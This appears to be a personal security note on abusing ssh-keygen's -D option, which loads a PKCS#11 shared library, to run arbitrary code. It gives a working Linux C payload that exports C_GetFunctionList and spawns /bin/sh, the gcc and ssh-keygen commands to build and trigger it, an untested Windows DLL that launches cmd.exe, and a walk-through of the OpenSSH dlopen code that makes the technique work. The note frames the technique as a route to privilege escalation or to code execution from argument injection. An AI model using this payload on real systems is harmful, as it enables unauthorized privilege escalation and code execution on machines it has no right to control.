The `ssh-keygen` command can be used to load a shared library with the `-D` flag. This can be useful for privilege escalation, or to translate to arbitrary code execution from argument injection, file overwrites, etc.
The man page says the following,
```plaintext
-D pkcs11
             Download the public keys provided by the PKCS#11 shared library pkcs11. When used in combination with -s, this option indicates that a CA key resides in a PKCS#11 token.
```

# Payload PoC
```c
// lib2shell.c
#include <stdio.h>
#include <unistd.h>

#define SHELL_COMMAND "/bin/sh"

void C_GetFunctionList()
//  __attribute__ ((constructor)) **Not necessarily needed**
{
    printf("Starting %s\n", SHELL_COMMAND);
    long long err = execl(SHELL_COMMAND, "/bin/sh", "-c", SHELL_COMMAND, NULL);
    printf("Result: %lld\n", err);
}
```
```bash
gcc -shared -o lib2shell.so lib2shell.c
ssh-keygen -D ./lib2shell.so
```
> [!tip]
> Learn more about [[../programming/C_C++/GCC Compiler Specific Features#GCC Constructor-Destructor Attribute|__attribute__ ((constructor))]] here. 

## Payload Mechanism
First, I needed to understand the structure of the payload. The mechanism loads a shared library (`*.so` on Unix, `*.dll` on Windows), so I probably needed to export some predefined symbol that ssh-keygen was expecting.
A standard way to load a shared library in C is to use the [`dlopen`](https://linux.die.net/man/3/dlopen) function. I searched the OpenSSH source code for this function, and found what I was looking for in [`ssh-pkcs11.c`](https://github.com/openssh/libopenssh/blob/ea5ceecdc2037c5e6e807ab3702fbe3f319351d0/ssh/ssh-pkcs11.c#L486):
```c
// [...]
    /* open shared pkcs11-libarary */
    if ((handle = dlopen(provider_id, RTLD_NOW)) == NULL) {
        error("dlopen %s failed: %s", provider_id, dlerror());
        goto fail;
    }
    if ((getfunctionlist = dlsym(handle, "C_GetFunctionList")) == NULL) {
        error("dlsym(C_GetFunctionList) failed: %s", dlerror());
        goto fail;
    }
    p = xcalloc(1, sizeof(*p));
    p->name = xstrdup(provider_id);
    p->handle = handle;
    /* setup the pkcs11 callbacks */
    if ((rv = (*getfunctionlist)(&f)) != CKR_OK) {
        error("C_GetFunctionList failed: %lu", rv);
        goto fail;
    }
    // [...]
```
The variable provider_id contains the library file path, and the function returns a handle that can be used to interact with the library in memory.
```c
handle = dlopen(provider_id, RTLD_NOW)
```

Next, it searches the newly-loaded library for an exported function called `C_GetFunctionList` and stores the function pointer in the variable `getfunctionlist`
```c
getfunctionlist = dlsym(handle, "C_GetFunctionList")
```
If `C_GetFunctionList` is found, the function is called,
```c
rv = (*getfunctionlist)(&f)
```

After that, it doesn't really matter what happens. We control the code inside `C_GetFunctionList`, so we can do whatever we want. For my scenario, I wanted to get an elevated shell, so the easiest thing to do would be to call one of the functions in the [exec](https://linux.die.net/man/3/exec) family to transform the ssh-keygen process into a new shell instance.
To summarize, I needed to create a shared library (`*.so`) that exports a function called `C_GetFunctionList`, and that function would call something like the following:

```c
execl("/bin/sh", "/bin/sh", NULL);
```

## Untested Windows Payload
```c
#define WIN32_LEAN_AND_MEAN    // Exclude rarely-used stuff from Windows headers

#include <windows.h>
#include <stdio.h>
#include <process.h>

#define SHELL_COMMAND "C:\\Windows\\System32\\cmd.exe"

BOOL APIENTRY DllMain(HMODULE h_module, DWORD  ul_reason_for_call, LPVOID lp_reserved)
{
    long long err = -2;
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        puts("[lib2shell by SeanP]");
        printf("Starting %s\n", SHELL_COMMAND);
        err = _execl(SHELL_COMMAND, "C:\\Windows\\System32\\cmd.exe", "/c", SHELL_COMMAND, NULL);
        printf("Result: %lld\n", err);
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
```
